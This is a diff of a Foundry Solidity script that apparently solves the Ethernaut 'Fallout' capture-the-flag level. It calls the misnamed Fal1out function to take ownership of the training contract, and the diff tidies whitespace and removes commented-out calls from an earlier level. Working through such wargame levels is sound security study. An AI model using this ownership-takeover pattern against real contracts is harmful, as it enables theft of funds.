@@ -13,31 +13,19 @@ interface IFallout {
 }
 
 contract Level2FalloutSolution is Script {
-    
-
     function setUp() public {}
 
     function run() public {
         address level2Fallout = payable(0x095A3F1521EcF1B0003C2cd5d54693e7833De21F);
-        
+
         console.log("The owner Before was", IFallout(level2Fallout).owner());
 
-        vm.startBroadcast(vm.envUint("PRIVATE_KEY")); 
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
         IFallout(level2Fallout).Fal1out{value: 0.0001 ether}();
 
         console.log("The owner now is", IFallout(level2Fallout).owner());
 
-        // level2Fallout.contribute{value: 0.0001 ether}();
-        
-        // (bool ok,) = address(level2Fallout).call{value: 0.0001 ether}("");
-        // require(ok, "ETH send failed");
-
-        // console.log("The owner is:", level2Fallout.owner());
-
-        // level2Fallout.withdraw();
-
         vm.stopBroadcast();
-      
     }
 }
